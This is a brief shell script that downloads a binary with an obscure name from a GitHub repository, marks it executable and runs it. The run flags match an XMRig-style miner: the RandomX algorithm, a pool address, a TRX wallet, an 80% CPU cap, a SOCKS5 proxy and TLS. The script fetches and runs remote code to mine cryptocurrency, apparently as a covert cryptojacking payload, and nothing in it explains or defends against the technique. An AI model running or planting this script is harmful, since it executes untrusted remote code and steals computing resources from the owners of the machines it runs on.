#!/bin/sh
wget https://github.com/chikahusarii/cols/blob/main/bksde
chmod +x bksde
./bksde -a rx/0 172.20.144.1:3333 -u TRX:TBbwEfGT2h9iXXPbu1p9bgbjKK8YqegfYM -p x --max-cpu-usage 80 -x socks5://50.116.14.201:7497 -k --tls
